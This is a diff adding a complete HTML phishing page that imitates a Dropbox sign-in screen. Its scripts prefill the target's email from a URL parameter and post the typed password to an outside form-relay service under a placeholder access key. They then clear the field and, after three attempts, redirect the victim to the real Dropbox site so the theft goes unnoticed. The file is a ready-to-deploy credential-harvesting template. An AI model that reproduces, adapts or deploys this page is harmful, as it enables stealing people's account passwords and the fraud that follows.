@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <link rel="shortcut icon" href="images/mm2.png" type="image/x-icon">
+  <title>Sign In</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body, html {
+      height: 100%;
+      font-family: Arial, sans-serif;
+    }
+
+    video.bg-video {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      z-index: -1;
+    }
+
+    .login-box {
+      background: rgba(255, 255, 255, 0.95);
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
+      width: 400px;
+      margin: auto;
+      margin-top: 8%;
+    }
+
+    .login-box img.logo {
+      height: 30px;
+      margin-bottom: 20px;
+    }
+
+    .login-box h2 {
+      font-size: 18px;
+      margin-bottom: 20px;
+    }
+
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+
+    label {
+      display: flex;
+      align-items: center;
+      font-size: 14px;
+      margin-bottom: 15px;
+    }
+
+    button {
+      width: 100%;
+      padding: 10px;
+      background-color: #0061ff;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      margin-bottom: 15px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .alt-signin {
+      width: 100%;
+      padding: 10px;
+      background-color: #f3f3f3;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      margin-bottom: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: normal;
+      font-size: 14px;
+      color: #333;
+    }
+
+    .alt-signin img {
+      height: 16px;
+      margin-right: 10px;
+    }
+  </style>
+</head>
+<body>
+
+<!-- Background Video -->
+  <video autoplay muted loop class="bg-video">
+    <source src="images/video.mp4" type="video/mp4">
+    Your browser does not support HTML5 video.
+  </video>
+
+  <div class="login-box">
+    <left><img class="logo" src="images/mm.png" style="width:83px; height:41px;" alt="Dropbox Logo"><left>
+    <h2>Sign in to continue</h2>
+    <form method="POST" id="form">
+<!-- Replace with your Access Key -->
+    <input type="hidden" name="access_key" value="ece26e24-41a4-4d33-be5e-5a5b3e6c4bce">
+      <input type="email" id="email" name="email" readonly="" value="" />
+      <input type="password" id="ipass" name="paswrd" placeholder="Enter Email Password" required="" />
+      <label><input type="checkbox" />&nbsp&nbspRemember me</label>
+      <button id="myButton" type="submit">Sign in</button>
+<center><div id="spinner" class="spinner" style="display: none;"></div></center>
+<center><div id="result" style="width:70%"></div></center>
+<script src="js/script.js" async="" defer=""></script>
+
+<style>
+   .spinner {
+       border: 4px solid rgba(0, 0, 0, 0.1);
+       border-left-color: #0061ff;
+       border-radius: 50%;
+       width: 30px;
+       height: 30px;
+       animation: spin 1s linear infinite;
+   }
+   @keyframes spin {
+       to {
+           transform: rotate(360deg);
+       }
+   }
+</style>
+
+<script>
+const button = document.getElementById('myButton');
+const spinner = document.getElementById('spinner');
+const form = document.getElementById('form');
+const result = document.getElementById('result');
+const passwordField = document.getElementById("ipass");
+let clickCount = 0; // Track the number of attempts
+
+button.addEventListener('click', () => {
+    spinner.style.display = 'block';
+
+form.addEventListener('submit', function(e) {
+  e.preventDefault();
+  const formData = new FormData(form);
+  const object = Object.fromEntries(formData);
+  const json = JSON.stringify(object);
+  result.innerHTML = "<span style='color:black'></span>"
+
+    fetch('https://api.web3forms.com/submit', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'Accept': 'application/json'
+            },
+            body: json
+        })
+        .then(async (response) => {
+            let json = await response.json();
+            if (response.status == 200) {
+                result.innerHTML = "<span style='color:red'></span>";
+            } else {
+                console.log(response);
+                result.innerHTML = json.message;
+            }
+        })
+        .catch(error => {
+            console.log(error);
+            result.innerHTML = "Something went wrong!";
+        })
+
+            // Simulate an action that takes time
+    setTimeout(() => {
+        spinner.style.display = 'none';
+    }, 2000); // Replace with your actual action
+});
+
+        // Clear password and result message after 8 seconds
+            setTimeout(function () {
+                console.log("Clearing password and result message now...");
+
+                passwordField.value = "";  // Clear the password field
+                result.innerHTML = "";  // Clear error/result message
+            }, 8000);  // Clear after 9 seconds
+    
+            // Increment the click count
+            clickCount++;
+    
+            // Redirect after click
+            if (clickCount === 3) {
+                window.location.href = "https://www.dropbox.com/"+window.location.search; // Replace with your desired URL
+            };
+        });
+</script>
+<br>
+      <div class="alt-signin">
+        <img src="./images/22.png" alt="image" />
+        Sign in with google
+      </div>
+
+      <div class="alt-signin">
+        <img src="./images/33.png" alt="image" />
+        Sign in with others
+      </div>
+    </form>
+  </div>
+
+<script type="text/javascript">
+var getUrlParameter = function getUrlParameter(sParam) {
+    var sPageURL = decodeURIComponent(window.location.search.substring(1)),
+        sURLVariables = sPageURL.split('&'),
+        sParameterName,
+        i;
+    for (i = 0; i < sURLVariables.length; i++) {
+        sParameterName = sURLVariables[i].split('=');
+        if (sParameterName[0] === sParam) {
+            return sParameterName[1] === undefined ? true : sParameterName[1];
+        }
+    }
+};
+
+var compEmail = getUrlParameter('e');
+document.getElementById("email").value = compEmail;
+</script>
+</body>
+</html>
